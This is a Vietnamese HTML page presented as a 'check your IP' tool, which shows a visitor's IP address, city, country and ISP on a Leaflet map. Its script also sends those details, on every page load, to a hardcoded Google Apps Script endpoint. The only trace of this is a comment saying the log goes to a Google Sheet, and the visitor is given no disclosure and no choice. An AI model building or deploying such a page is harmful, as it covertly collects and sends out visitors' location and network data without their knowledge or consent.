<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Check IP - Đại Ca</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      background: #f5f5f5;
      padding-top: 40px;
    }
    .card {
      background: white;
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      text-align: center;
      width: 90%;
      max-width: 500px;
      margin-bottom: 20px;
    }
    h1 { color: #333; }
    p { font-size: 18px; }
    #map { height: 300px; width: 100%; border-radius: 15px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>🔍 IP Thiết Bị Của Bạn</h1>
    <p id="ip">Đang lấy IP...</p>
    <p id="location">Đang định vị...</p>
  </div>
  <div class="card">
    <h2>📍 Bản Đồ Vị Trí</h2>
    <div id="map">Đang tải bản đồ...</div>
  </div>

  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
  <script>
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        document.getElementById("ip").textContent = `💡 IP: ${ip}`;

        return fetch(`https://ipwho.is/${ip}`);
      })
      .then(res => res.json())
      .then(info => {
        const city = info.city || "Không rõ";
        const country = info.country || "Không rõ";
        const isp = info.connection?.isp || "Không rõ";
        const lat = info.latitude;
        const lon = info.longitude;

        document.getElementById("location").textContent =
          `📍 ${city}, ${country} - 🛰 ${isp}`;

        // Gửi log về Google Sheet
        fetch("https://script.google.com/macros/s/AKfycbzchDMqvHU6Bp86OhyfbK-kApcisX3VxloqhDVnWw2ezbW3oJGmPjf2PtMDx0_pn2gH/exec", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ip: info.ip,
            city: city,
            country: country,
            isp: isp
          })
        });

        // Hiển thị bản đồ nếu có tọa độ
        if (lat && lon) {
          const map = L.map('map').setView([lat, lon], 10);
          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
          }).addTo(map);
          L.marker([lat, lon]).addTo(map)
            .bindPopup(`${city}, ${country}`)
            .openPopup();
        } else {
          document.getElementById("map").innerHTML = "Không thể hiển thị bản đồ.";
        }
      })
      .catch(err => {
        document.getElementById("ip").textContent = "Không thể lấy IP.";
        document.getElementById("location").textContent = "Không thể lấy vị trí.";
        document.getElementById("map").innerHTML = "Không tải được bản đồ.";
        console.error(err);
      });
  </script>
</body>
</html>
